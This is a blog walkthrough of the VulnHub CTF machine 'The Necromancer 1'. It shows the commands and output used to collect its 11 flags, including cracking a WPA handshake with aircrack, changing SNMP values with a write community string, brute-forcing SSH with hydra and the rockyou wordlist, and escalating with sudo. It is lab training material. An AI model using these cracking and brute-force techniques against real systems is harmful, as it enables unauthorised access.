---
layout: post
title: The Necromancer 1 Walkthrough
subtitle: Virtual Machine hosted on vulnhub from Xerubus
date: 2017-05-12 00:00:00
lastupdated: 
category: Vulnhub
tags: [vulnhub, walkthrough]
bigimg: /img/walkthrough4.jpg
comments: true
---

# Table of contents
{:.no_toc}

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}

## Preface

Today I'm ready to publish my walkthrough against the vm hosted on vulnhub called [The Necromancer 1](https://www.vulnhub.com/entry/the-necromancer-1,154/) by Xerubus.

The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.

There are 11 flags to collect to solve the challenge. Let's start!

## Flag 1

I started from netdiscover to find the vm's ip
![Net Discover](/assets/the-necromancer-1/netdiscover.png)

I noticed that the vm's ip renewed every 900 seconds but it's not something we should care about. I launched some nmap commands but there weren't any open ports. I also tested several other techniques, but the ports remained closed. I was a bit confused.. :confused: Sometimes the penetration testing can be frustrating and it's easy to lose your patience!

So I launched wireshark, then I started reading the packets and I thought: "WTF?" The vm was trying to connect to my Kali VM on port 4444 with tcp protocol.
![Wireshark](/assets/the-necromancer-1/wireshark.png)

So I listened to that port with netcat and nothing... after a few minutes I saw this:
![NetCat](/assets/the-necromancer-1/netcat.png)

It looked like a base64 string, so I decoded it:
![Flag 1](/assets/the-necromancer-1/flag1.png)

Good! The first Flag was finally obtained but first I had to decrypt the md5 string: 
![MD5 Flag 1](/assets/the-necromancer-1/md5-flag1.png)

## Flag 2
Then in the base64 decoded string I could always see another interesting info below:

```plaintext
"Chant the string of flag1 - u666"
```

I was a little bit confused because I'd never done such a VM, so I thought to try connecting on udp port 666:
![Flag 2](/assets/the-necromancer-1/flag2.png)

Awesome!! I found the second Flag! I came back to decrypter's webpage and I found the decrypted key:
![MD5 Flag 2](/assets/the-necromancer-1/md5-flag2.png)

It was a number but I couldn't know what to do with it. So I saved it and I thought it was alright to go a step further.

## Flag 3
I tried to connect on port 80 but with a big surprise, because I had already tried it before, I viewed this:
![The Chasm](/assets/the-necromancer-1/the-chasm.png)

I looked into webpage's source code, but there wasn't anything else but a jpg image. I downloaded it and I tried to examine it with exif:
![The Chasm Exif](/assets/the-necromancer-1/the-chasm-exif.png)

We have no value of color space, that’s interesting... Probably it contains files so I launched binwalk to extract a file inside:
![The Chasm Binwalk](/assets/the-necromancer-1/the-chasm-binwalk.png)

We can see that there was a zip archive inside, and a txt file named feathers.txt. I navigated into extracted folder and I could see another base64 string, so I decoded it and I received the third flag with another hint!!
![The Chasm Feathers.txt](/assets/the-necromancer-1/flag3.png)

I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag 3](/assets/the-necromancer-1/md5-flag3.png)

It is another number but we don't know what to do with it. 

## Flag 4
In the file viewed before we could see the hint "Cross the chasm at /amagicbridgeappearsatthechasm" so I browsed into this website path and I viewed:
![The Cave](/assets/the-necromancer-1/the-cave.png)

Another page with an image! I tried to repeat step before but it seemed a normal image:
![The Cave Exiftool](/assets/the-necromancer-1/the-cave-exiftool.png)

Not knowing what to do I decided to scan the entire website with dirb.. it will assist me uncovering the hidden magic :stuck_out_tongue_winking_eye:
![The Cave Dirb](/assets/the-necromancer-1/the-cave-dirb.png)

Yes! I found a file named talisman, so I downloaded it. It is a 32 bit executable. So I executed it and when I saw inside nothing happened. :disappointed:
![The Cave Talisman](/assets/the-necromancer-1/the-cave-talisman.png)

I decided to debug it with GNU Debugger! :smiling_imp: First I viewed some functions, two of those were named wearTalisman and chantToBreakSpell. I put a break on wearTalisman and then a jump to chantToBreakSpell:

```plaintext
root@kali:~# gdb talisman
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from talisman...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini
(gdb) break wearTalisman
Breakpoint 1 at 0x804852d
(gdb) run
Starting program: /root/talisman 

Breakpoint 1, 0x0804852d in wearTalisman ()
(gdb) jump chantToBreakSpell
Continuing at 0x8048a3b.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[Inferior 1 (process 1820) exited normally]
(gdb)
```

Finally I found the fourth flag!! I came back to the decrypter's webpage and I found the decrypted hash:
![MD5 Flag 4](/assets/the-necromancer-1/md5-flag4.png)

## Flag 5
In the text I could see another interesting hint below:

```plaintext
Chant these words at u31337
```

So I launched again netcat on udp port 31337 
![Flag 5](/assets/the-necromancer-1/flag5.png)

And like this I found the fifth flag. I came back to the decrypter's webpage and I found the decrypted hash:
![MD5 Flag 5](/assets/the-necromancer-1/md5-flag5.png)

## Flag 6
In the text we can see the new website path (/thenecromancerwillabsorbyoursoul/) then I navigated into:
![The Door](/assets/the-necromancer-1/the-door.png)

I found the sixth flag! I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag6](/assets/the-necromancer-1/md5-flag6.png)

## Flag 7
I viewed into the webpage's source code and I found a file named necromancer, so I downloaded it and I saw that it contained a network captured pcap file inside:

```plaintext
root@kali:~# wget http://192.10.2.5/thenecromancerwillabsorbyoursoul/necromancer
--2017-05-12 19:58:39--  http://192.10.2.5/thenecromancerwillabsorbyoursoul/necromancer
Connessione a 192.10.2.5:80...connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 10355 (10K) [application/octet-stream]
Salvataggio in: "necromancer"

necromancer                100%[=====================================>]  10,11K  --.-KB/s    in 0,02s

2017-05-12 19:58:39 (571 KB/s) - "necromancer" salvato [10355/10355]
root@kali:~# file necromancer 
necromancer: bzip2 compressed data, block size = 900k
root@kali:~# bunzip2 necromancer
bunzip2: Can't guess original name for necromancer -- using necromancer.out
root@kali:~# file necromancer.out 
necromancer.out: POSIX tar archive (GNU)
root@kali:~# tar xfv necromancer.out 
necromancer.cap
root@kali:~# file necromancer.cap 
necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
root@kali:~# 
```
We can open it with Wireshark and I discovered IEEE 802.11 WiFi traffic inside. There was a beacon frame for the SSID community:
![Wireshark Necromancer pcap](/assets/the-necromancer-1/wireshark-necromancer-pcap.png)

Then scrolling down I could see some deauth packets and also a captured handshake.
![Wireshark Necromancer pcap](/assets/the-necromancer-1/wireshark-necromancer-pcap-packet.png)

So let's try to crack it with aircrack using the found packet's BSSID and the rockyou wordlist:
![Aircrack](/assets/the-necromancer-1/aircrack.png)

Oh yes!! We found it in no time :sunglasses: !! At this point I came back on the website and I kept reading it:
![The Door](/assets/the-necromancer-1/the-door2.png)

I tried to connect on udp port 161 another time but unsuccessfully:

```plaintext
root@kali:~# nc -uv 192.10.2.5 161
192.10.2.5: inverse host lookup failed: Unknown host
(UNKNOWN) [192.10.2.5] 161 (snmp) open
death2all
^C
root@kali:~# 
```
Looking at the protocol I could see that it was snmp. So I lauched snmpcheck but it returned as an error:

```plaintext
root@kali:~# snmpcheck -t 192.10.2.5
test: .1.3.6.1.4.1.2021.2.1
suff: .2.1
test: .1.3.6.1.4.1.2021.4
suff: 
test: .1.3.6.1.4.1.2021.8.1
suff: .8.1
test: .1.3.6.1.4.1.2021.9.1
suff: .9.1
test: .1.3.6.1.4.1.2021.10.1
suff: .10.1
test: .1.3.6.1.4.1.2021.101
suff: 
No community name specified.
```

So I investigated a bit and I decided to use snmpwalk with the password previously found in the community parameter:

```plaintext
root@kali:~# snmpwalk -v 2c -c death2all 192.10.2.5
Created directory: /var/lib/snmp/mib_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

It seemed that the door needed to be unlocked but iso.3.6.1.2.1.1.6.0 said it is locked. It also seemed to provide the read and write community string. Let's change some MIBS!

```plaintext
root@kali:~# snmpset -v 2c -c death2allrw 192.10.2.5 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
root@kali:~# snmpwalk -v 2c -c death2all 192.10.2.5 iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
root@kali:~# snmpwalk -v 2c -c death2all 192.10.2.5
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
root@kali:~# 
```
Excellent! flag 7 is also obtained! The md5 hash decrypted is demonslayer:
![MD5 Flag 7](/assets/the-necromancer-1/md5-flag7.png)

## Flag 8
It seemed that the tcp port 22, supposedly ssh, is opened. So I tried to verify if it is right with nmap:

```plaintext
root@kali:~# nmap -sS -sV 192.10.2.5

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-12 20:17 CEST
Nmap scan report for 192.10.2.5
Host is up (0.00069s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
MAC Address: 08:00:27:0D:44:3C (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.00 seconds
```

Cool! The port 22 is opened. So I tried to crack the demonslayer user with rockyou wordlist because I noticed that I found all the passwords with this wordlist! :stuck_out_tongue_winking_eye:

```
root@kali:~# hydra -l demonslayer -P /root/wordlist/rockyou.txt -t 4 -V 192.10.2.5 ssh
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-12 20:20:40
[DATA] max 4 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~56032 tries per task
[DATA] attacking service ssh on port 22
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "123456" - 1 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "12345" - 2 of 14344398 [child 1] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "password" - 4 of 14344398 [child 3] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "iloveyou" - 5 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "princess" - 6 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "1234567" - 7 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "rockyou" - 8 of 14344398 [child 1] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "12345678" - 9 of 14344398 [child 2] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "abc123" - 10 of 14344398 [child 0] (0/0)
[ATTEMPT] target 192.10.2.5 - login "demonslayer" - pass "nicole" - 11 of 14344398 [child 1] (0/0)
[22][ssh] host: 192.10.2.5   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-12 20:20:45
```
In fact I also found this password :wink: !! So I connected with these credentials and I found flag8.txt in home folder:

```plaintext
root@kali:~# ssh demonslayer@192.10.2.5
The authenticity of host '192.10.2.5 (192.10.2.5)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.10.2.5' (ECDSA) to the list of known hosts.
demonslayer@192.10.2.5's password: 

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

$ pwd
/home/demonslayer
$ ls -l
total 4
-rw-r--r--  1 demonslayer  demonslayer  706 May 11  2016 flag8.txt
$ cat flag8.txt
You enter the Necromancer's Lair!

A stench of decay fills this place.

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!

$ 
```

When I opened it there wasn't the flag8, but it said "Counter attack the Necromancer's spells at u777!". It seemed to be another reference to a udp port. I unsuccessfully tried to connect remotely. Perhaps it would be better to use a localhost connection:

```plaintext
$ nc -u localhost 777 



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?
```
I googled the question and I found [this site](https://en.wikipedia.org/wiki/Tsurani), so I tried to answer:

```plaintext
Where do the Black Robes practice magic of the Greater Path?  Kelewan

flag8{55a6af2ca3fee9f2fef81d20743bda2c}
```
Oh yes! I found flag 8! So of course I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag 8](/assets/the-necromancer-1/md5-flag8.png)

## Flag 9

```plaintext
** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?
```
I googled the second question and I found [this site](http://shamankingarchive.wikia.com/wiki/Faust_VIII), so I tried to answer:

```plaintext
Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}
```
Oh yes, I found the flag 9!! I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag 9](/assets/the-necromancer-1/md5-flag9.png)

## Flag 10

```plaintext
** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?
```
I googled the second question and I found [this site](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters), so I tried to answer:

```plaintext
Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.
```
I found the flag 10!! We almost done. I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag 10](/assets/the-necromancer-1/md5-flag10.png)

## Flag 11
The hint seemed to be for a smallvile. So where is it? I tried sudo su command just in case it worked, but nothing.
I decided to start searching around by using the locate command and then I found the .smallvile file:
![Small Vile](/assets/the-necromancer-1/smallvile.png)

After some testing, I tried to launch again sudo su command but now it said that the demonslayer user is not allowed to execute su command as root. This 'error' was different from my previous sudo command's output because when I tried to sudo it very specifically said I wasn't in the sudoers list. Maybe now we can use sudo command to find the 11th flag. Presumably it was in the root folder and I used the same type of name like the rest of the flags found before:
![Flag 11](/assets/the-necromancer-1/flag11.png)

BOOOM BABY!! I found the last flag! I came back to decrypter's webpage and I found the decrypted hash:
![MD5 Flag 11](/assets/the-necromancer-1/md5-flag11.png)

## Conclusion
Thanks to Xerubus for this interesting CTF. You must put some serious work into this challenge for completing. Good Work!!
